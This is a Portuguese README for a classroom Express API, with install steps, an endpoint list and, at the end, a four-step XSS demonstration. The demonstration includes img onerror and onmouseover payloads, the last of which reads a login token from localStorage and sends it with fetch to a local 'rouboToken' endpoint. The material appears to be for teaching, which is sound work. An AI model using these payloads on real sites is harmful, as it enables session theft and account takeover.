## 🚀 API LOCAL

API que irei usar nas aula de DESKTOP

## Installation

Use o NPM para fazer a instalação das bibliotecas após baixar o repositório

!!! IMPORTANTE, crie as tabelas no seu banco de dados igual no arquivo tabelas.sql

```bash
npm install
```

```bash
npm install typescript ts-node express @types/node @types/express
```

```bash
npm install nodemon
```

## Rodar a aplicação

```
npm run start-dev

```

```http
  GET /ping
```

```http
  POST /cadastrarUsuario
```

```http
  POST /fazerLogin
```

```http
  GET /listarEmails
```

```http
  GET /listarTodosUsuarios
```

```http
  DELETE /deletarUsuario/:id
```

```http
  PUT /atualizarUsuario/:id
```

```http
  GET /pegarUsuarioPeloId/:id
```

```http
  GET /mostrarNotificacao
```

```http
  PATCH /atualizarNotificacao

```


1º Passo: Verificar se o input recebe um script 
<img src='nemexiste' onerror='console.log("To dentro do sistema")'/>

2º Passo: Registrar um token via console para ser roubado 

3ºPasso - Colocar uma imagem que será feito um scipt malicioso ao ser passada por cima 
<img 
  src="https://media.licdn.com/dms/image/v2/D4D03AQGyFmBltUalew/profile-displayphoto-shrink_800_800/profile-displayphoto-shrink_800_800/0/1695938689937?e=1738195200&v=beta&t=VvCX9rPGBJwMLCRP2uuBsmi0_9teSr92ibSMLSUlrxw" 
  onmouseover="console.log('Mouse passou sobre a imagem!')" 
  />

4ºPasso - Capturar o token que está no local storage e enviar para uma API maliciosa
<img 
  src="https://scontent.fpoa10-1.fna.fbcdn.net/v/t39.30808-6/463122329_3558369394309010_1503674593130181477_n.jpg?_nc_cat=100&ccb=1-7&_nc_sid=a5f93a&_nc_ohc=pFZhjJd2aIMQ7kNvgEEGcVW&_nc_zt=23&_nc_ht=scontent.fpoa10-1.fna&_nc_gid=Aa7Dvb8QfpnpI6Fy83HhubE&oh=00_AYAhRKZkiQ1xJZdBsX8jnkflex1jpJv3w9Xq44rgPmwzOA&oe=674B8A46" 
  onmouseover='fetch("http://localhost:4000/rouboToken?token=" + localStorage.getItem("token"))' />

